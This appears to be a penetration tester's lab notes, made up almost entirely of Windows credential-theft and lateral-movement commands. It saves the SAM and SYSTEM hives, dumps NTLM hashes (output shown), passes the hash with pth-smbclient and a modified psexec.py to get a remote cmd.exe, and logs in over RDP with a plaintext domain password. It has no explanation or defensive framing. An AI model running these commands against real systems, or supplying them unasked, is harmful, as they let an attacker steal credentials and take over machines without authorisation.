reg save hklm\sam c:\sam
reg save hklm\system c:\system

samdump2 system sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c0e2874fb130015aec4070975e2c6071:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:d0c0896b73e0d1316aeccf93159d7ec0:::

fgdump.exe

pth-smbclient -p 4445 -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE //127.0.0.1/c$


copied psexec.py to local folder and updated default port to the forwarded port.

python3 ./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE alice@127.0.0.1 cmd.exe

rdesktop -d xor.com -u daisy -p XorPasswordIsDead17 10.11.1.122 -r clipboard:CLIPBOARD


